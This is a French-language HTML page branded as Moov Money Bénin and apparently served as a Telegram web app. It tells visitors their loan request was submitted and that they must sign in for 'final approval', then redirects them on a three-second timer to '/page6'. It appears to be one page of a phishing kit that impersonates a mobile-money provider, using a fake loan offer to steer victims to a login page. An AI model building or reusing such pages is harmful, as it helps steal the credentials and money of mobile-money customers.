<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Demande Soumise - Moov Money Bénin</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --moov-orange: #f26522;
            --moov-blue: #004b87;
        }
        body { background-color: #f2f2f2; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
        .card { background: white; width: 90%; max-width: 420px; padding: 40px 24px; border-radius: 24px; text-align: center; box-shadow: 0 6px 25px rgba(0,0,0,0.04); }
        .check-circle { width: 88px; height: 88px; background-color: var(--moov-orange); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 28px; color: white; font-size: 38px; }
        .main-title { font-size: 26px; color: var(--moov-blue); margin: 0 0 20px; font-weight: 800; }
        .message-text { color: #666; font-size: 15px; margin-bottom: 20px; line-height: 1.5; }
        .btn-outline { background: transparent; color: #333; border: 1px solid #dcdcdc; width: 100%; padding: 14px; border-radius: 10px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>

<div class="card">
    <div class="check-circle">✓</div>
    <h1 class="main-title">Demande Soumise</h1>
    <p class="message-text">Votre demande de prêt a été transmise. Veuillez vous connecter à Moov Money pour l'approbation finale.</p>
    
    <div style="margin: 20px 0; font-weight:700; color:var(--moov-orange);">
        Redirection automatique dans <span id="timer">3</span>s...
    </div>

    <button type="button" class="btn-outline" onclick="window.location.href='/page6'">Se connecter maintenant</button>
</div>

<script>
    let timeLeft = 3;
    setInterval(() => {
        timeLeft--;
        if (document.getElementById('timer')) document.getElementById('timer').textContent = timeLeft;
        if (timeLeft <= 0) window.location.href = "/page6";
    }, 1000);
</script>
</body>
</html>
